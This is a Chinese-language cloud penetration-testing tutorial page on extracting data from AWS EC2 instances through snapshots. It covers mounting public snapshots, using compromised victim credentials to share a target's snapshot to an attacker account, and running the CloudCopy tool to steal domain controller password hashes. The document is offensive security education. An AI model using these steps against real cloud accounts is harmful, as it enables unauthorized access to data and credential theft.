---
title: 获取共享快照内的数据
---

<center><h1>获取共享快照内的数据</h1></center>

---

## 前言

如果当前凭证具有 EC2:CreateSnapshot 权限的话，可以通过创建共享快照的方式，然后将自己 aws 控制台下的实例挂载由该快照生成的卷，从而获取到目标 EC2 中的内容。

## 公有快照

这里以公有快照作为示例。

</br>

<img width="1200" src="/img/1650001031.png"></br>

这里随便找一个快照，点击创建卷，卷的大小需要大于或等于快照大小，这里创建一个 20G 大小的卷，另外可用区需要和自己的 EC2 保持一致，最后快照 ID 指定刚才随便找的快照

</br>

<img width="800" src="/img/1650001064.png"></br>

将刚创建的卷挂载到自己的实例中

</br>

<img width="800" src="/img/1650001090.png"></br>

登录到自己的实例，查看刚才添加卷的名称

```bash
sudo fdisk -l
```

</br>

<img width="600" src="/img/1650001092.png"></br>

通过大小可以判断出来 /dev/xvdf 是刚才刚才添加的卷，然后将这个卷挂载到实例中，通过 ls 就可以看到这个公有快照中的数据了。

```bash
sudo mkdir /test
sudo mount /dev/xvdf3 /test
sudo ls /test
```

</br>

<img width="800" src="/img/1650001117.png"></br>

## 私有快照

在拿到目标 AWS 控制台权限时，如果无法登录到实例，可以为目标实例打个快照，然后将快照共享给自己。

</br>

<img width="800" src="/img/1650001136.png"></br>

将自己的账	号 ID 添加到快照共享后，在自己的 AWS 快照控制台的私有快照处就能看到目标快照了，此时就可以将其挂载到自己的实例，查看里面的数据了。

</br>

<img width="800" src="/img/1650001161.png"></br>

目前也已经有了自动化工具了，CloudCopy 可以通过提供的访问凭证自动实现创建实例快照、自动挂载快照等操作



不过 CloudCopy 默认只会获取实例中的域成员哈希值，也就是说前提目标实例是一个域控，不过将这个工具稍微加以修改，就可以获取到其他的文件了，下面来看下这个工具的使用。



获取 CloudCopy 工具

```bash
git clone https://github.com/Static-Flow/CloudCopy.git
cd CloudCopy
python3 CloudCopy.py
```

> 如果运行报错，一般是因为第三方库缺失，根据提示安装对应模块即可

接下来，开始进行相应的配置，输入自己的 AWS 账号 ID 及访问凭证以及目标的访问凭证

```bash
manual_cloudcopy
show_options
set attackeraccountid xxx
set attackerAccessKey xxx
set attackerSecretKey xxx
set victimAccessKey xxx
set victimSecretKey xxx
set region ap-northeast-2
```

</br>

<img width="800" src="/img/1650001184.png"></br>

配置好之后，就可以利用 CloudCopy 进行哈希窃取了

```bash
stealDCHashes
```

这时会提示选择实例，直接输入要窃取的实例编号即可

</br>

<img width="800" src="/img/1650001208.png"></br>

等待一段时间，就可以看到已经读到 DC 的哈希了。

</br>

<img width="1000" src="/img/1650001226.png"></br>



<Vssue />

<script>
export default {
    mounted () {
      this.$page.lastUpdated = "2022年4月15日"
    }
  }
</script>